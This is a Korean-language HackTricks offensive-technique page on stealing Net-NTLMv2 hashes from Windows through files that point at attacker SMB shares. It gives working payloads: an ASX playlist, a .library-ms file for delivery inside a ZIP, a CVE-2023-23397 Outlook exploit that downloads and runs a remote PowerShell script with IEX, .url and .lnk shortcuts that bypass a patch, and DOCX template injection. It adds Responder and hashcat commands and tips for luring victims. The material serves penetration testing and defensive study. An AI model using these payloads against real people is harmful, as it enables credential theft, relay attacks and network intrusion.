# NTLM creds를 훔칠 수 있는 장소

{{#include ../../banners/hacktricks-training.md}}

**다음의 훌륭한 아이디어들을 확인하세요: [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) — 온라인에서 microsoft word 파일을 다운로드하는 경우부터 ntlm leaks source: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md 및 [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)까지 확인해 보세요.**


### Windows Media Player playlists (.ASX/.WAX)

제어하는 Windows Media Player playlist를 대상이 열거나 미리보기하도록 만들 수 있다면, 항목을 UNC 경로로 지정해서 Net‑NTLMv2를 leak할 수 있습니다. WMP는 참조된 미디어를 SMB를 통해 가져오려고 시도하며 암묵적으로 인증합니다.

Example payload:
```xml
<asx version="3.0">
<title>Leak</title>
<entry>
<title></title>
<ref href="file://ATTACKER_IP\\share\\track.mp3" />
</entry>
</asx>
```
수집 및 크래킹 흐름:
```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
### ZIP에 포함된 .library-ms NTLM leak (CVE-2025-24071/24055)

Windows Explorer는 ZIP 아카이브 내에서 직접 열릴 때 .library-ms 파일을 안전하지 않게 처리합니다. 라이브러리 정의가 원격 UNC 경로(예: \\attacker\share)를 가리키면, ZIP 안에서 .library-ms를 단순히 찾아보거나 실행하는 것만으로 Explorer가 해당 UNC를 열거하고 공격자에게 NTLM 인증을 전송합니다. 이로 인해 NetNTLMv2가 생성되며, cracked offline되거나 잠재적으로 relayed될 수 있습니다.

공격자 UNC를 가리키는 최소 .library-ms
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<version>6</version>
<name>Company Documents</name>
<isLibraryPinned>false</isLibraryPinned>
<iconReference>shell32.dll,-235</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation>
<url>\\10.10.14.2\share</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
운영 단계
- 위의 XML로 .library-ms 파일을 생성합니다 (IP/hostname을 설정하세요).
- 이를 ZIP으로 압축합니다 (on Windows: Send to → Compressed (zipped) folder) 그리고 ZIP을 대상에 전달합니다.
- NTLM capture listener를 실행하고 피해자가 ZIP 내부에서 .library-ms를 열 때까지 기다립니다.

### Outlook 캘린더 알림 사운드 경로 (CVE-2023-23397) – zero‑click Net‑NTLMv2 leak

Microsoft Outlook for Windows는 캘린더 항목에서 확장 MAPI 프로퍼티 PidLidReminderFileParameter를 처리했습니다. 해당 프로퍼티가 UNC 경로(예: \\attacker\share\alert.wav)를 가리키면, 리마인더가 울릴 때 Outlook은 SMB 공유에 접속하여 클릭 없이 사용자의 Net‑NTLMv2를 leak했습니다. 이 문제는 2023년 3월 14일에 패치되었지만, 레거시/미업데이트된 시스템과 과거 인시던트 대응에는 여전히 매우 관련이 있습니다.

Quick exploitation with PowerShell (Outlook COM):
```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```
리스너 측:
```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```
참고
- 피해자는 알림이 트리거될 때 Outlook for Windows만 실행 중이면 된다.
- 이 leak는 Net‑NTLMv2를 생성하여 offline cracking이나 relay에 적합하다( not pass‑the‑hash).


### .LNK/.URL 아이콘 기반 제로‑클릭 NTLM leak (CVE‑2025‑50154 – bypass of CVE‑2025‑24054)

Windows Explorer는 바로가기 아이콘을 자동으로 렌더링한다. 최근 연구에서는 Microsoft의 2025년 4월 UNC‑icon shortcuts 패치 이후에도, 바로가기 대상(target)을 UNC 경로에 호스트하고 아이콘은 로컬에 두면 클릭 없이 NTLM 인증을 트리거할 수 있음이 밝혀졌다(패치 우회로 CVE‑2025‑50154로 지정됨). 단지 폴더를 보는 것만으로 Explorer가 원격 대상에서 메타데이터를 가져와 공격자 SMB 서버로 NTLM을 전송한다.

최소 Internet Shortcut payload (.url):
```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```
PowerShell을 통한 Program Shortcut payload (.lnk):
```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```
Delivery ideas
- ZIP에 shortcut을 넣어 피해자가 찾아보도록 유도.
- 피해자가 열어볼 쓰기 가능한 share에 shortcut을 둔다.
- 같은 폴더의 다른 lure files와 함께 배치해 Explorer에서 아이템을 미리보기하도록 한다.


### Office remote template injection (.docx/.dotm) to coerce NTLM

Office 문서는 외부 template를 참조할 수 있다. 첨부된 template를 UNC 경로로 설정하면 문서를 열 때 SMB로 인증이 수행된다.

Minimal DOCX relationship changes (inside word/):

1) word/settings.xml을 편집하고 첨부된 template 참조를 추가:
```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```
2) word/_rels/settings.xml.rels를 편집하고 rId1337을 귀하의 UNC로 가리키도록 지정하십시오:
```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```
3) .docx로 재패키징하여 전달한다. SMB capture listener를 실행하고 연결이 열릴 때까지 기다린다.

캡처 이후 NTLM relaying 또는 abusing에 관한 아이디어는 다음을 확인하세요:

{{#ref}}
README.md
{{#endref}}


## 참고자료
- [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 to DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Morphisec – 5 NTLM vulnerabilities: Unpatched privilege escalation threats in Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [MSRC – Microsoft mitigates Outlook EoP (CVE‑2023‑23397) and explains the NTLM leak via PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [Cymulate – Zero‑click, one NTLM: Microsoft security patch bypass (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)


{{#include ../../banners/hacktricks-training.md}}
